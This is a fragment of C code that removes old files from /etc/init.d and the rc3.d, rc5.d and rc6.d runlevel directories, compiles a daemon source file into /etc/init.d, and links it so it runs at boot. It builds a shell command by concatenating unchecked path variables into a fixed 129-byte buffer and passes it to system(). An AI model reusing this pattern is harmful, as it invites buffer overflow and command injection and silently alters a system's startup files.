
void action_TxL() {

    if ( is_file("/etc/init.d/?")   ) {
       remove("/etc/init.d/?");}

    if ( is_file("/etc/rc3.d/S05?") ) {
       remove("/etc/rc3.d/S05?");}

    if ( is_file("/etc/rc5.d/S05?") ) {
       remove("/etc/rc5.d/S05?");}

    if ( is_file("/etc/rc6.d/K05?") ) {
       remove("/etc/rc6.d/K05?");}





    char            buffer_commandline[129];


    strcpy         (buffer_commandline, "gcc "                 );
    strcat         (buffer_commandline, path_the               );
    strcat         (buffer_commandline, "/"                    );
    strcat         (buffer_commandline, name_the               );
    strcat         (buffer_commandline, "/box/c/head/deamon.c" );
    strcat         (buffer_commandline, " -o"                  );
    strcat         (buffer_commandline, " /etc/init.d/?"       );

    system(buffer_commandline);



    system("ln /etc/init.d/? /etc/rc3.d/S05?");
    system("ln /etc/init.d/? /etc/rc5.d/S05?");
    system("ln /etc/init.d/? /etc/rc6.d/K05?");}